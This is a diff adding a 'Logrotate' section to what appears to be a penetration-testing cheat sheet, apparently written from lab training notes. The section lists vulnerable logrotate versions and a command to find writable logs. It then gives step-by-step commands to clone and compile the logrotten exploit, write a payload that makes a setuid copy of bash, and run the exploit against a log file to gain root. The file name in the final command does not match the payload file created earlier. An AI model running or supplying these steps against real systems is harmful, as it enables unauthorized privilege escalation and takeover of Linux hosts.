@@ -1127,3 +1127,25 @@ spec:
   automountServiceAccountToken: true
   hostNetwork: true
 ```
+###### Logrotate
+Prerequisites
+```
+vulnerable versions:
+3.8.6
+3.11.0
+3.15.0
+3.18.0
+Logrotate running as root (default on most Linux distributions)
+User has write access to log files or parent directories
+
+# Look for writable log files
+find / -name "*.log" -writable 2>/dev/null
+```
+exploit
+```
+git clone https://github.com/whotwagner/logrotten.git
+gcc logrotten.c -o logrotten
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > payload
+echo "trigger rotation" >> path_of_writable_log_file
+./logrotten -p payloadfile /home/htb-student/backups/access.log
+```
